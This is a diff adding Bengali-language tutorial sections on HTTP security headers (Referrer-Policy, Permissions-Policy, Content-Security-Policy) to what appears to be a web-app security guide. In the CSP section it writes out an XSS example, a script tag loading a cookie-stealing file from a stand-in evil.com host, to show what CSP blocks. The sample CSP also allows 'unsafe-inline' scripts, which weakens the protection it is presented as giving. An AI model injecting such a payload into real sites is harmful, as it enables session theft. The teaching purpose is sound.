@@ -57,3 +57,48 @@ module.exports = {
 ✅ nosniff দিলে:
 ব্রাউজার বলে "সার্ভার বলেছে এটা image, তাই image হিসেবেই ট্রিট করব"
 ```
+### ৪. Referrer-Policy: strict-origin-when-cross-origin
+```
+{ key: "Referrer-Policy", value: "strict-origin-when-cross-origin" }
+```
+কী করে?
+অন্য সাইটে যাওয়ার সময় আপনার সাইটের URL কতটুকু শেয়ার হবে তা নিয়ন্ত্রণ করে।
+উদাহরণ:
+```
+আপনার সাইট: https://myapp.com/dashboard?token=abc123
+ইউজার অন্য সাইটে ক্লিক করল
+
+❌ Policy ছাড়া: অন্য সাইট দেখবে "?token=abc123" — বিপজ্জনক!
+✅ এই Policy দিলে: শুধু "https://myapp.com" যাবে, secret কিছু না
+```
+### ৫. Permissions-Policy
+```
+{ key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" }
+```
+কী করে?
+আপনার সাইট ক্যামেরা, মাইক্রোফোন, বা লোকেশন কখনোই ব্যবহার করতে পারবে না।
+কেন দরকার?
+```
+❌ ছাড়া: আপনার সাইটে কোনো third-party script ঢুকে
+          ইউজারের ক্যামেরা চালু করার চেষ্টা করতে পারে
+
+✅ দিলে: ব্রাউজার সরাসরি block করবে, permission চাইতেও পারবে না
+```
+### ৬. Content-Security-Policy (CSP) ⭐ সবচেয়ে গুরুত্বপূর্ণ
+```
+{
+  key: "Content-Security-Policy",
+  value: "default-src 'self'; script-src 'self' 'unsafe-inline';"
+}
+```
+কী করে?
+ব্রাউজারকে বলে দেয় — "শুধু আমার নিজের সার্ভার থেকে আসা content লোড করো।"
+কোন আক্রমণ থেকে বাঁচায়? → XSS (Cross-Site Scripting)
+```
+javascript// ❌ XSS Attack উদাহরণ:
+// হ্যাকার কমেন্ট বক্সে এটা লেখে:
+<script src="https://evil.com/steal-cookies.js"></script>
+
+// CSP ছাড়া: ব্রাউজার এই script চালিয়ে দেবে!
+// CSP দিলে: ব্রাউজার বলবে "evil.com allowed না, block!"
+```
